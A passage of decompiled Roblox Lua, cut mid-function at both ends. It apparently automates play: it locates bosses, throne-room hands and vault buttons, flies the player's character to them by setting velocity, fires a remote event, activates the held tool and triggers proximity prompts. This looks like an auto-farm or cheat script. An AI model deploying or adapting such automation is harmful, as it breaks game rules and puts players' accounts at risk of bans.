                                                    get_pivot_2 = nil
                                                end
                                                if (30.0 < get_pivot_2) then
                                                    basehitbox = capture_1_156176.value
                                                    ipairs_4 = Vector3.new
                                                    name_3 = 0.0
                                                    get_pivot_3 = 5.0
                                                    ipairs_4_result = 0.0
                                                    ipairs_4 = ipairs_4(name_3, get_pivot_3, ipairs_4_result)
                                                    ipairs_4 = (name_2) + (ipairs_4)
                                                    basehitbox = basehitbox(ipairs_4)
                                                    health_4 = basehitbox
                                                else
                                                    basehitbox = (tick()) * (12.0)
                                                    ipairs_4 = 12.0
                                                    name_3 = 22.0
                                                    get_pivot_3 = Vector3.new
                                                    ipairs_4_result = math
                                                    if ipairs_4_result ~= nil then
                                                        ipairs_4_result = ipairs_4_result.cos
                                                    else
                                                        ipairs_4_result = nil
                                                    end
                                                    ipairs_4_result = (ipairs_4_result(basehitbox)) * (ipairs_4)
                                                    val_180 = name_3
                                                    magnitude = math
                                                    if magnitude ~= nil then
                                                        magnitude = magnitude.sin
                                                    else
                                                        magnitude = nil
                                                    end
                                                    val_181 = basehitbox
                                                    magnitude = (magnitude(val_181)) * (ipairs_4)
                                                    get_pivot_3 = get_pivot_3(ipairs_4_result, val_180, magnitude)
                                                    health_4 = (name_2) + (get_pivot_3)
                                                    ipairs_3 = 120.0
                                                end
                                            else
                                                if korth_result then
                                                    name_2 = capture_1_156176.value
                                                    get_pivot_2 = vaultTarget
                                                    basehitbox = get_pivot_2
                                                    if get_pivot_2 then
                                                        get_pivot_2 = get_pivot_2.GetPivot
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    get_pivot_2 = get_pivot_2(basehitbox)
                                                    if get_pivot_2 ~= nil then
                                                        get_pivot_2 = get_pivot_2.Position
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    name_2 = name_2(get_pivot_2)
                                                    health_4 = name_2
                                                else
                                                    name_2 = capture_1_156176.value
                                                    get_pivot_2 = vaultTarget
                                                    basehitbox = get_pivot_2
                                                    if get_pivot_2 then
                                                        get_pivot_2 = get_pivot_2.GetPivot
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    get_pivot_2 = get_pivot_2(basehitbox)
                                                    if get_pivot_2 ~= nil then
                                                        get_pivot_2 = get_pivot_2.Position
                                                    else
                                                        get_pivot_2 = nil
                                                    end
                                                    basehitbox = Vector3.new
                                                    ipairs_4 = 0.0
                                                    name_3 = 5.0
                                                    get_pivot_3 = 0.0
                                                    basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                    get_pivot_2 = (get_pivot_2) + (basehitbox)
                                                    name_2 = name_2(get_pivot_2)
                                                    health_4 = name_2
                                                end
                                            end
                                        end
                                        name_2 = capture_1_156162.value
                                        if name_2 ~= nil then
                                            name_2 = name_2.Position
                                        else
                                            name_2 = nil
                                        end
                                        name_2 = (health_4) - (name_2)
                                        if name_2 ~= nil then
                                            name_2 = name_2.Unit
                                        else
                                            name_2 = nil
                                        end
                                        get_pivot_2 = capture_1_156162.value
                                        if get_pivot_2 ~= nil then
                                            get_pivot_2 = get_pivot_2.Position
                                        else
                                            get_pivot_2 = nil
                                        end
                                        get_pivot_2 = (health_4) - (get_pivot_2)
                                        if get_pivot_2 ~= nil then
                                            get_pivot_2 = get_pivot_2.Magnitude
                                        else
                                            get_pivot_2 = nil
                                        end
                                        if (2.0 < get_pivot_2) then
                                            basehitbox = (name_2) * (ipairs_3)
                                            if korth then
                                                korth.Velocity = basehitbox
                                            end
                                        else
                                            basehitbox = Vector3.zero
                                            if korth then
                                                korth.Velocity = basehitbox
                                            end
                                        end
                                        basehitbox = capture_1_156163.value
                                        if basehitbox then
                                            basehitbox.PlatformStand = true
                                        end
                                        if korth_result then
                                            basehitbox = pcall
                                            local capture_77_186113_2, capture_77_186114_2 = val_173, val_174
                                            ipairs_4 = function()
                                                local activate_2, tool_4
                                                local fire_server_10 = capture_77_186113_2.value
                                                if fire_server_10 then
                                                    fire_server_10 = capture_77_186113_2.value
                                                    activate_2 = fire_server_10
                                                    if fire_server_10 then
                                                        fire_server_10 = fire_server_10.FireServer
                                                    else
                                                        fire_server_10 = nil
                                                    end
                                                    fire_server_10(activate_2)
                                                end
                                                fire_server_10 = capture_77_186114_2.value
                                                if fire_server_10 then
                                                    fire_server_10 = capture_77_186114_2.value
                                                    activate_2 = fire_server_10
                                                    if fire_server_10 then
                                                        fire_server_10 = fire_server_10.FindFirstChildOfClass
                                                    else
                                                        fire_server_10 = nil
                                                    end
                                                    tool_4 = "Tool"
                                                    fire_server_10 = fire_server_10(activate_2, tool_4)
                                                end
                                                if fire_server_10 then
                                                    tool_4 = fire_server_10
                                                    if fire_server_10 then
                                                        activate_2 = fire_server_10.Activate
                                                    else
                                                        activate_2 = nil
                                                    end
                                                    activate_2(tool_4)
                                                end
                                                return
                                            end
                                            basehitbox(ipairs_4)
                                        else
                                            basehitbox = vaultTarget
                                            if basehitbox then
                                                basehitbox = vaultTarget
                                                ipairs_4 = basehitbox
                                                if basehitbox then
                                                    basehitbox = basehitbox.FindFirstChildOfClass
                                                else
                                                    basehitbox = nil
                                                end
                                                name_3 = "Humanoid"
                                                basehitbox = basehitbox(ipairs_4, name_3)
                                                if basehitbox then
                                                    basehitbox = val_175
                                                    basehitbox()
                                                end
                                            end
                                        end
                                    end
                                end
                            else
                                value_19 = (capture_1_156164.value)()
                                if in_cutscene_2 then
                                    capture_1_156165.value = in_cutscene_2
                                end
                                find_first_child_11 = val_169
                                val_178 = find_first_child_11
                                if find_first_child_11 then
                                    find_first_child_11 = find_first_child_11.FindFirstChild
                                else
                                    find_first_child_11 = nil
                                end
                                atticus = "Atticus"
                                find_first_child_11 = find_first_child_11(val_178, atticus)
                                val_178 = false
                                if find_first_child_11 then
                                    health_2 = find_first_child_11
                                    if find_first_child_11 then
                                        atticus = find_first_child_11.FindFirstChild
                                    else
                                        atticus = nil
                                    end
                                    humanoid_2 = "Humanoid"
                                    atticus = atticus(health_2, humanoid_2)
                                    if atticus then
                                        if atticus ~= nil then
                                            health_2 = atticus.Health
                                        else
                                            health_2 = nil
                                        end
                                        if (0.0 < health_2) then
                                            humanoid_2 = atticus
                                            if atticus then
                                                health_2 = atticus.GetState
                                            else
                                                health_2 = nil
                                            end
                                            health_2 = health_2(humanoid_2)
                                            humanoid_2 = Enum.HumanoidStateType
                                            if humanoid_2 ~= nil then
                                                humanoid_2 = humanoid_2.Dead
                                            else
                                                humanoid_2 = nil
                                            end
                                            if health_2 ~= humanoid_2 then
                                                val_178 = true
                                            end
                                        end
                                    end
                                end
                                atticus = val_170()
                                if (atticus == "AncientSands") then
                                    if val_178 then
                                        atticus = type
                                        health_2 = capture_1_156165.value
                                        atticus = atticus(health_2)
                                        if (atticus == "number") then
                                            atticus = capture_1_156165.value
                                            if (20.0 <= atticus) then
                                                atticus = 20.0
                                                capture_1_156165.value = atticus
                                            end
                                        end
                                    end
                                end
                                atticus = val_169
                                health_2 = atticus
                                if atticus then
                                    atticus = atticus.FindFirstChild
                                else
                                    atticus = nil
                                end
                                humanoid_2 = "AkumaBossFight"
                                atticus = atticus(health_2, humanoid_2)
                                health_2 = false
                                if atticus then
                                    health_3 = atticus
                                    if atticus then
                                        humanoid_2 = atticus.FindFirstChild
                                    else
                                        humanoid_2 = nil
                                    end
                                    humanoid_3 = "Humanoid"
                                    humanoid_2 = humanoid_2(health_3, humanoid_3)
                                    if humanoid_2 then
                                        if humanoid_2 ~= nil then
                                            health_3 = humanoid_2.Health
                                        else
                                            health_3 = nil
                                        end
                                        if (0.0 < health_3) then
                                            humanoid_3 = humanoid_2
                                            if humanoid_2 then
                                                health_3 = humanoid_2.GetState
                                            else
                                                health_3 = nil
                                            end
                                            health_3 = health_3(humanoid_3)
                                            humanoid_3 = Enum.HumanoidStateType
                                            if humanoid_3 ~= nil then
                                                humanoid_3 = humanoid_3.Dead
                                            else
                                                humanoid_3 = nil
                                            end
                                            if health_3 ~= humanoid_3 then
                                                health_2 = true
                                            end
                                        end
                                    end
                                end
                                humanoid_2 = val_170()
                                if (humanoid_2 == "HauntedTundra") then
                                    if health_2 then
                                        humanoid_2 = type
                                        health_3 = capture_1_156165.value
                                        humanoid_2 = humanoid_2(health_3)
                                        if (humanoid_2 == "number") then
                                            humanoid_2 = capture_1_156165.value
                                            if (11.0 <= humanoid_2) then
                                                humanoid_2 = 11.0
                                                capture_1_156165.value = humanoid_2
                                            end
                                        end
                                    end
                                end
                                humanoid_2 = (capture_1_156168.value)()
                                if (humanoid_2 == nil) then
                                    health_3 = false
                                else
                                    health_3 = true
                                end
                                humanoid_3 = val_170()
                                if (humanoid_3 == "HauntedTundra") then
                                    if health_3 then
                                        humanoid_3 = type
                                        aura_radius = capture_1_156165.value
                                        humanoid_3 = humanoid_3(aura_radius)
                                        if (humanoid_3 == "number") then
                                            humanoid_3 = capture_1_156165.value
                                            if (17.0 <= humanoid_3) then
                                                humanoid_3 = 17.0
                                                capture_1_156165.value = humanoid_3
                                            end
                                        end
                                    end
                                end
                                humanoid_3 = capture_1_156165.value
                                if humanoid_3 ~= 20.0 then
                                    capture_1_156169.value = false
                                    humanoid_3 = false
                                    capture_1_156170.value = humanoid_3
                                end
                                humanoid_3 = val_170()
                                if (humanoid_3 == "HauntedTundra") then
                                    humanoid_3 = health_2
                                else
                                    humanoid_3 = false
                                end
                                if humanoid_3 then
                                    aura_radius = capture_1_156171.value
                                    if not aura_radius then
                                        aura_radius = val_168
                                        if aura_radius ~= nil then
                                            aura_radius = aura_radius.AuraRadius
                                        else
                                            aura_radius = nil
                                        end
                                        capture_1_156171.value = aura_radius
                                    end
                                    aura_radius = val_168
                                    if aura_radius then
                                        aura_radius.AuraRadius = 30.0
                                    end
                                else
                                    aura_radius = capture_1_156171.value
                                    if aura_radius then
                                        aura_radius = val_168
                                        vault = capture_1_156171.value
                                        if aura_radius then
                                            aura_radius.AuraRadius = vault
                                        end
                                        aura_radius = nil
                                        capture_1_156171.value = aura_radius
                                    end
                                end
                                aura_radius = val_170()
                                if (aura_radius == "AncientSands") then
                                    aura_radius = capture_1_156165.value
                                    if aura_radius ~= 20.0 then
                                        aura_radius = false
                                    else
                                        aura_radius = true
                                    end
                                else
                                    aura_radius = false
                                end
                                vault = workspace:FindFirstChild("Vault")
                                vaultTarget = nil
                                throne_room = workspace:FindFirstChild("ThroneRoom")
                                workspace_7 = workspace
                                val_179 = workspace_7
                                workspace_7 = workspace_7.FindFirstChild
                                korth = "Korth"
                                workspace_7 = workspace_7(val_179, korth)
                                val_179 = false
                                if workspace_7 then
                                    health_4 = workspace_7
                                    if workspace_7 then
                                        korth = workspace_7.FindFirstChild
                                    else
                                        korth = nil
                                    end
                                    humanoid_4 = "Humanoid"
                                    korth = korth(health_4, humanoid_4)
                                    if korth then
                                        if korth ~= nil then
                                            health_4 = korth.Health
                                        else
                                            health_4 = nil
                                        end
                                        if (0.0 < health_4) then
                                            humanoid_4 = korth
                                            if korth then
                                                health_4 = korth.GetState
                                            else
                                                health_4 = nil
                                            end
                                            health_4 = health_4(humanoid_4)
                                            humanoid_4 = Enum.HumanoidStateType
                                            if humanoid_4 ~= nil then
                                                humanoid_4 = humanoid_4.Dead
                                            else
                                                humanoid_4 = nil
                                            end
                                            if health_4 ~= humanoid_4 then
                                                val_179 = true
                                            end
                                        end
                                    end
                                end
                                if throne_room then
                                    korth = #thronePositions
                                    if (korth < 2.0) then
                                        korth = ipairs
                                        humanoid_4 = throne_room
                                        if throne_room then
                                            health_4 = throne_room.GetChildren
                                        else
                                            health_4 = nil
                                        end
                                        pack_result_67 = pack(health_4(humanoid_4))
                                        if pack_result_67.n >= 1 then
                                            health_4 = pack_result_67[1]
                                        end
                                        if pack_result_67.n >= 2 then
                                            humanoid_4 = pack_result_67[2]
                                        end
                                        if pack_result_67.n >= 3 then
                                            korth_result = pack_result_67[3]
                                        end
                                        if pack_result_67.n >= 4 then
                                            ipairs_3 = pack_result_67[4]
                                        end
                                        if pack_result_67.n >= 5 then
                                            name_2 = pack_result_67[5]
                                        end
                                        if pack_result_67.n >= 6 then
                                            get_pivot_2 = pack_result_67[6]
                                        end
                                        if pack_result_67.n >= 7 then
                                            basehitbox = pack_result_67[7]
                                        end
                                        if pack_result_67.n >= 8 then
                                            ipairs_4 = pack_result_67[8]
                                        end
                                        if pack_result_67.n >= 9 then
                                            name_3 = pack_result_67[9]
                                        end
                                        if pack_result_67.n >= 10 then
                                            get_pivot_3 = pack_result_67[10]
                                        end
                                        if pack_result_67.n >= 11 then
                                            ipairs_4_result = pack_result_67[11]
                                        end
                                        if pack_result_67.n >= 12 then
                                            val_180 = pack_result_67[12]
                                        end
                                        if pack_result_67.n >= 13 then
                                            magnitude = pack_result_67[13]
                                        end
                                        if pack_result_67.n >= 14 then
                                            val_181 = pack_result_67[14]
                                        end
                                        korth = korth(unpack(pack_result_67, 1, pack_result_67.n))
                                        while true do
                                            korth_result = korth(health_4, humanoid_4)
                                            if korth_result ~= nil then
                                                humanoid_4 = korth_result
                                                if ipairs_3 ~= nil then
                                                    name_2 = ipairs_3.Name
                                                else
                                                    name_2 = nil
                                                end
                                                if (name_2 == "BookHand") then
                                                    get_pivot_2 = ipairs_3
                                                    if ipairs_3 then
                                                        name_2 = ipairs_3.FindFirstChild
                                                    else
                                                        name_2 = nil
                                                    end
                                                    basehitbox = "basehitbox"
                                                    name_2 = name_2(get_pivot_2, basehitbox)
                                                    if name_2 then
                                                        basehitbox = name_2
                                                        if name_2 then
                                                            get_pivot_2 = name_2.GetPivot
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        get_pivot_2 = get_pivot_2(basehitbox)
                                                        if get_pivot_2 ~= nil then
                                                            get_pivot_2 = get_pivot_2.Position
                                                        else
                                                            get_pivot_2 = nil
                                                        end
                                                        basehitbox = false
                                                        ipairs_4 = ipairs
                                                        name_3 = thronePositions
                                                        ipairs_4 = ipairs_4(name_3)
                                                        while true do
                                                            ipairs_4_result = ipairs_4(name_3, get_pivot_3)
                                                            if ipairs_4_result ~= nil then
                                                                get_pivot_3 = ipairs_4_result
                                                                magnitude = (val_180) - (get_pivot_2)
                                                                if magnitude ~= nil then
                                                                    magnitude = magnitude.Magnitude
                                                                else
                                                                    magnitude = nil
                                                                end
                                                                if (magnitude < 5.0) then
                                                                    basehitbox = true
                                                                    break
                                                                end
                                                            else
                                                                break
                                                            end
                                                        end
                                                        if not basehitbox then
                                                            ipairs_4 = table
                                                            if ipairs_4 ~= nil then
                                                                ipairs_4 = ipairs_4.insert
                                                            else
                                                                ipairs_4 = nil
                                                            end
                                                            name_3 = thronePositions
                                                            get_pivot_3 = get_pivot_2
                                                            ipairs_4(name_3, get_pivot_3)
                                                        end
                                                    end
                                                end
                                            else
                                                break
                                            end
                                        end
                                    end
                                    korth = false
                                    health_4 = false
                                    humanoid_4 = nil
                                    korth_result = nil
                                    ipairs_3 = ipairs
                                    get_pivot_2 = throne_room
                                    if throne_room then
                                        name_2 = throne_room.GetChildren
                                    else
                                        name_2 = nil
                                    end
                                    pack_result_67 = pack(name_2(get_pivot_2))
                                    if pack_result_67.n >= 1 then
                                        name_2 = pack_result_67[1]
                                    end
                                    if pack_result_67.n >= 2 then
                                        get_pivot_2 = pack_result_67[2]
                                    end
                                    if pack_result_67.n >= 3 then
                                        basehitbox = pack_result_67[3]
                                    end
                                    if pack_result_67.n >= 4 then
                                        ipairs_4 = pack_result_67[4]
                                    end
                                    if pack_result_67.n >= 5 then
                                        name_3 = pack_result_67[5]
                                    end
                                    if pack_result_67.n >= 6 then
                                        get_pivot_3 = pack_result_67[6]
                                    end
                                    if pack_result_67.n >= 7 then
                                        ipairs_4_result = pack_result_67[7]
                                    end
                                    if pack_result_67.n >= 8 then
                                        val_180 = pack_result_67[8]
                                    end
                                    if pack_result_67.n >= 9 then
                                        magnitude = pack_result_67[9]
                                    end
                                    if pack_result_67.n >= 10 then
                                        val_181 = pack_result_67[10]
                                    end
                                    ipairs_3 = ipairs_3(unpack(pack_result_67, 1, pack_result_67.n))
                                    while true do
                                        basehitbox = ipairs_3(name_2, get_pivot_2)
                                        if basehitbox ~= nil then
                                            get_pivot_2 = basehitbox
                                            if ipairs_4 ~= nil then
                                                name_3 = ipairs_4.Name
                                            else
                                                name_3 = nil
                                            end
                                            if (name_3 == "BookHand") then
                                                get_pivot_3 = ipairs_4
                                                if ipairs_4 then
                                                    name_3 = ipairs_4.FindFirstChild
                                                else
                                                    name_3 = nil
                                                end
                                                ipairs_4_result = "basehitbox"
                                                name_3 = name_3(get_pivot_3, ipairs_4_result)
                                                if name_3 then
                                                    ipairs_4_result = name_3
                                                    if name_3 then
                                                        get_pivot_3 = name_3.GetPivot
                                                    else
                                                        get_pivot_3 = nil
                                                    end
                                                    get_pivot_3 = get_pivot_3(ipairs_4_result)
                                                    if get_pivot_3 ~= nil then
                                                        get_pivot_3 = get_pivot_3.Position
                                                    else
                                                        get_pivot_3 = nil
                                                    end
                                                    ipairs_4_result = #thronePositions
                                                    if (1.0 <= ipairs_4_result) then
                                                        ipairs_4_result = thronePositions
                                                        if ipairs_4_result ~= nil then
                                                            ipairs_4_result = ipairs_4_result[1.0]
                                                        else
                                                            ipairs_4_result = nil
                                                        end
                                                        ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                        if ipairs_4_result ~= nil then
                                                            ipairs_4_result = ipairs_4_result.Magnitude
                                                        else
                                                            ipairs_4_result = nil
                                                        end
                                                        if (ipairs_4_result < 5.0) then
                                                            humanoid_4 = ipairs_4
                                                            ipairs_4_result = val_171
                                                            val_180 = ipairs_4
                                                            ipairs_4_result = ipairs_4_result(val_180)
                                                            if (0.0 < ipairs_4_result) then
                                                                korth = true
                                                            end
                                                        else
                                                            ipairs_4_result = #thronePositions
                                                            if (2.0 <= ipairs_4_result) then
                                                                ipairs_4_result = thronePositions
                                                                if ipairs_4_result ~= nil then
                                                                    ipairs_4_result = ipairs_4_result[2.0]
                                                                else
                                                                    ipairs_4_result = nil
                                                                end
                                                                ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                                if ipairs_4_result ~= nil then
                                                                    ipairs_4_result = ipairs_4_result.Magnitude
                                                                else
                                                                    ipairs_4_result = nil
                                                                end
                                                                if (ipairs_4_result < 5.0) then
                                                                    korth_result = ipairs_4
                                                                    ipairs_4_result = val_171
                                                                    val_180 = ipairs_4
                                                                    ipairs_4_result = ipairs_4_result(val_180)
                                                                    if (0.0 < ipairs_4_result) then
                                                                        health_4 = true
                                                                    end
                                                                end
                                                            end
                                                        end
                                                    else
                                                        ipairs_4_result = #thronePositions
                                                        if (2.0 <= ipairs_4_result) then
                                                            ipairs_4_result = thronePositions
                                                            if ipairs_4_result ~= nil then
                                                                ipairs_4_result = ipairs_4_result[2.0]
                                                            else
                                                                ipairs_4_result = nil
                                                            end
                                                            ipairs_4_result = (ipairs_4_result) - (get_pivot_3)
                                                            if ipairs_4_result ~= nil then
                                                                ipairs_4_result = ipairs_4_result.Magnitude
                                                            else
                                                                ipairs_4_result = nil
                                                            end
                                                            if (ipairs_4_result < 5.0) then
                                                                korth_result = ipairs_4
                                                                ipairs_4_result = val_171
                                                                val_180 = ipairs_4
                                                                ipairs_4_result = ipairs_4_result(val_180)
                                                                if (0.0 < ipairs_4_result) then
                                                                    health_4 = true
                                                                end
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        else
                                            break
                                        end
                                    end
                                    if not korth then
                                        if health_4 then
                                            ipairs_3 = currentThroneHandIndex
                                            if not ipairs_3 then
                                                if korth then
                                                    ipairs_3 = 1.0
                                                    if not ipairs_3 then
                                                        ipairs_3 = 2.0
                                                    end
                                                else
                                                    ipairs_3 = 2.0
                                                end
                                                currentThroneHandIndex = ipairs_3
                                            end
                                            if val_179 then
                                                if workspace_7 then
                                                    ipairs_3 = tick()
                                                    name_2 = capture_1_156173.value
                                                    ipairs_3 = (ipairs_3) - (name_2)
                                                    if (3.0 < ipairs_3) then
                                                        if workspace_7 ~= nil then
                                                            ipairs_3 = workspace_7.HumanoidRootPart
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        if ipairs_3 ~= nil then
                                                            ipairs_3 = ipairs_3.Position
                                                        else
                                                            ipairs_3 = nil
                                                        end
                                                        name_2 = capture_1_156162.value
                                                        if name_2 ~= nil then
                                                            name_2 = name_2.Position
                                                        else
                                                            name_2 = nil
                                                        end
                                                        name_2 = (name_2) - (ipairs_3)
                                                        if name_2 ~= nil then
                                                            name_2 = name_2.Magnitude
                                                        else
                                                            name_2 = nil
                                                        end
                                                        if (name_2 < 25.0) then
                                                            name_2 = currentThroneHandIndex
                                                            if (name_2 == 1.0) then
                                                                name_2 = 2.0
                                                                currentThroneHandIndex = name_2
                                                            else
                                                                name_2 = 1.0
                                                                currentThroneHandIndex = name_2
                                                            end
                                                            name_2 = tick()
                                                            capture_1_156173.value = name_2
                                                        end
                                                    end
                                                end
                                            end
                                            ipairs_3 = currentThroneHandIndex
                                            if (ipairs_3 == 1.0) then
                                                if korth then
                                                    ipairs_3 = korth
                                                else
                                                    ipairs_3 = currentThroneHandIndex
                                                    if (ipairs_3 == 2.0) then
                                                        ipairs_3 = health_4
                                                    else
                                                        ipairs_3 = false
                                                    end
                                                end
                                            else
                                                ipairs_3 = currentThroneHandIndex
                                                if (ipairs_3 == 2.0) then
                                                    ipairs_3 = health_4
                                                else
                                                    ipairs_3 = false
                                                end
                                            end
                                            if ipairs_3 then
                                                name_2 = currentThroneHandIndex
                                                if (name_2 == 1.0) then
                                                    if humanoid_4 then
                                                        name_2 = humanoid_4
                                                    else
                                                        name_2 = korth_result
                                                    end
                                                else
                                                    name_2 = korth_result
                                                end
                                                basehitbox = name_2
                                                if name_2 then
                                                    get_pivot_2 = name_2.FindFirstChild
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                ipairs_4 = "basehitbox"
                                                vaultTarget = (get_pivot_2(basehitbox, ipairs_4))
                                                get_pivot_2 = nil
                                                throneFlightPos = get_pivot_2
                                            else
                                                vaultTarget = nil
                                                name_2 = #thronePositions
                                                get_pivot_2 = currentThroneHandIndex
                                                if (get_pivot_2 <= name_2) then
                                                    name_2 = thronePositions
                                                    get_pivot_2 = currentThroneHandIndex
                                                    if name_2 ~= nil then
                                                        name_2 = name_2[get_pivot_2]
                                                    else
                                                        name_2 = nil
                                                    end
                                                    if not name_2 then
                                                        name_2 = nil
                                                    end
                                                else
                                                    name_2 = nil
                                                end
                                                throneFlightPos = name_2
                                            end
                                        else
                                            if val_179 then
                                                vaultTarget = workspace_7
                                                ipairs_3 = nil
                                                throneFlightPos = ipairs_3
                                            end
                                        end
                                    else
                                        ipairs_3 = currentThroneHandIndex
                                        if not ipairs_3 then
                                            if korth then
                                                ipairs_3 = 1.0
                                                if not ipairs_3 then
                                                    ipairs_3 = 2.0
                                                end
                                            else
                                                ipairs_3 = 2.0
                                            end
                                            currentThroneHandIndex = ipairs_3
                                        end
                                        if val_179 then
                                            if workspace_7 then
                                                ipairs_3 = tick()
                                                name_2 = capture_1_156173.value
                                                ipairs_3 = (ipairs_3) - (name_2)
                                                if (3.0 < ipairs_3) then
                                                    if workspace_7 ~= nil then
                                                        ipairs_3 = workspace_7.HumanoidRootPart
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    if ipairs_3 ~= nil then
                                                        ipairs_3 = ipairs_3.Position
                                                    else
                                                        ipairs_3 = nil
                                                    end
                                                    name_2 = capture_1_156162.value
                                                    if name_2 ~= nil then
                                                        name_2 = name_2.Position
                                                    else
                                                        name_2 = nil
                                                    end
                                                    name_2 = (name_2) - (ipairs_3)
                                                    if name_2 ~= nil then
                                                        name_2 = name_2.Magnitude
                                                    else
                                                        name_2 = nil
                                                    end
                                                    if (name_2 < 25.0) then
                                                        name_2 = currentThroneHandIndex
                                                        if (name_2 == 1.0) then
                                                            name_2 = 2.0
                                                            currentThroneHandIndex = name_2
                                                        else
                                                            name_2 = 1.0
                                                            currentThroneHandIndex = name_2
                                                        end
                                                        name_2 = tick()
                                                        capture_1_156173.value = name_2
                                                    end
                                                end
                                            end
                                        end
                                        ipairs_3 = currentThroneHandIndex
                                        if (ipairs_3 == 1.0) then
                                            if korth then
                                                ipairs_3 = korth
                                            else
                                                ipairs_3 = currentThroneHandIndex
                                                if (ipairs_3 == 2.0) then
                                                    ipairs_3 = health_4
                                                else
                                                    ipairs_3 = false
                                                end
                                            end
                                        else
                                            ipairs_3 = currentThroneHandIndex
                                            if (ipairs_3 == 2.0) then
                                                ipairs_3 = health_4
                                            else
                                                ipairs_3 = false
                                            end
                                        end
                                        if ipairs_3 then
                                            name_2 = currentThroneHandIndex
                                            if (name_2 == 1.0) then
                                                if humanoid_4 then
                                                    name_2 = humanoid_4
                                                else
                                                    name_2 = korth_result
                                                end
                                            else
                                                name_2 = korth_result
                                            end
                                            basehitbox = name_2
                                            if name_2 then
                                                get_pivot_2 = name_2.FindFirstChild
                                            else
                                                get_pivot_2 = nil
                                            end
                                            ipairs_4 = "basehitbox"
                                            vaultTarget = (get_pivot_2(basehitbox, ipairs_4))
                                            get_pivot_2 = nil
                                            throneFlightPos = get_pivot_2
                                        else
                                            vaultTarget = nil
                                            name_2 = #thronePositions
                                            get_pivot_2 = currentThroneHandIndex
                                            if (get_pivot_2 <= name_2) then
                                                name_2 = thronePositions
                                                get_pivot_2 = currentThroneHandIndex
                                                if name_2 ~= nil then
                                                    name_2 = name_2[get_pivot_2]
                                                else
                                                    name_2 = nil
                                                end
                                                if not name_2 then
                                                    name_2 = nil
                                                end
                                            else
                                                name_2 = nil
                                            end
                                            throneFlightPos = name_2
                                        end
                                    end
                                else
                                    if aura_radius then
                                        if vault then
                                            health_4 = vault
                                            if vault then
                                                korth = vault.FindFirstChild
                                            else
                                                korth = nil
                                            end
                                            humanoid_4 = "Button1"
                                            korth = korth(health_4, humanoid_4)
                                            if korth then
                                                if vault ~= nil then
                                                    korth = vault.Button1
                                                else
                                                    korth = nil
                                                end
                                                health_4 = korth
                                                if korth then
                                                    korth = korth.FindFirstChild
                                                else
                                                    korth = nil
                                                end
                                                humanoid_4 = "ButtonPress"
                                                korth = korth(health_4, humanoid_4)
                                                if korth then
                                                    if vault ~= nil then
                                                        korth = vault.Button1
                                                    else
                                                        korth = nil
                                                    end
                                                    if korth ~= nil then
                                                        korth = korth.ButtonPress
                                                    else
                                                        korth = nil
                                                    end
                                                    health_4 = korth
                                                    if korth then
                                                        korth = korth.FindFirstChild
                                                    else
                                                        korth = nil
                                                    end
                                                    humanoid_4 = "ProximityPrompt"
                                                    korth = korth(health_4, humanoid_4)
                                                end
                                            end
                                            humanoid_4 = vault
                                            if vault then
                                                health_4 = vault.FindFirstChild
                                            else
                                                health_4 = nil
                                            end
                                            korth_result = "Button2"
                                            health_4 = health_4(humanoid_4, korth_result)
                                            if health_4 then
                                                if vault ~= nil then
                                                    health_4 = vault.Button2
                                                else
                                                    health_4 = nil
                                                end
                                                humanoid_4 = health_4
                                                if health_4 then
                                                    health_4 = health_4.FindFirstChild
                                                else
                                                    health_4 = nil
                                                end
                                                korth_result = "ButtonPress"
                                                health_4 = health_4(humanoid_4, korth_result)
                                                if health_4 then
                                                    if vault ~= nil then
                                                        health_4 = vault.Button2
                                                    else
                                                        health_4 = nil
                                                    end
                                                    if health_4 ~= nil then
                                                        health_4 = health_4.ButtonPress
                                                    else
                                                        health_4 = nil
                                                    end
                                                    humanoid_4 = health_4
                                                    if health_4 then
                                                        health_4 = health_4.FindFirstChild
                                                    else
                                                        health_4 = nil
                                                    end
                                                    korth_result = "ProximityPrompt"
                                                    health_4 = health_4(humanoid_4, korth_result)
                                                end
                                            end
                                            humanoid_4 = capture_1_156169.value
                                            if not humanoid_4 then
                                                if korth then
                                                    if korth ~= nil then
                                                        humanoid_4 = korth.Enabled
                                                    else
                                                        humanoid_4 = nil
                                                    end
                                                    if humanoid_4 then
                                                        if vault ~= nil then
                                                            humanoid_4 = vault.Button1
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        if humanoid_4 ~= nil then
                                                            humanoid_4 = humanoid_4.ButtonPress
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        vaultTarget = humanoid_4
                                                        humanoid_4 = capture_1_156162.value
                                                        if humanoid_4 ~= nil then
                                                            humanoid_4 = humanoid_4.Position
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        korth_result = vaultTarget
                                                        ipairs_3 = korth_result
                                                        if korth_result then
                                                            korth_result = korth_result.GetPivot
                                                        else
                                                            korth_result = nil
                                                        end
                                                        korth_result = korth_result(ipairs_3)
                                                        if korth_result ~= nil then
                                                            korth_result = korth_result.Position
                                                        else
                                                            korth_result = nil
                                                        end
                                                        humanoid_4 = (humanoid_4) - (korth_result)
                                                        if humanoid_4 ~= nil then
                                                            humanoid_4 = humanoid_4.Magnitude
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        if (humanoid_4 <= 8.0) then
                                                            korth_result = capture_1_156174.value
                                                            ipairs_3 = korth
                                                            korth_result(ipairs_3)
                                                            korth_result = true
                                                            capture_1_156169.value = korth_result
                                                        end
                                                    else
                                                        humanoid_4 = true
                                                        capture_1_156169.value = humanoid_4
                                                    end
                                                else
                                                    humanoid_4 = true
                                                    capture_1_156169.value = humanoid_4
                                                end
                                            end
                                            humanoid_4 = capture_1_156169.value
                                            if humanoid_4 then
                                                humanoid_4 = capture_1_156170.value
                                                if not humanoid_4 then
                                                    if health_4 then
                                                        if health_4 ~= nil then
                                                            humanoid_4 = health_4.Enabled
                                                        else
                                                            humanoid_4 = nil
                                                        end
                                                        if humanoid_4 then
                                                            if vault ~= nil then
                                                                humanoid_4 = vault.Button2
                                                            else
                                                                humanoid_4 = nil
                                                            end
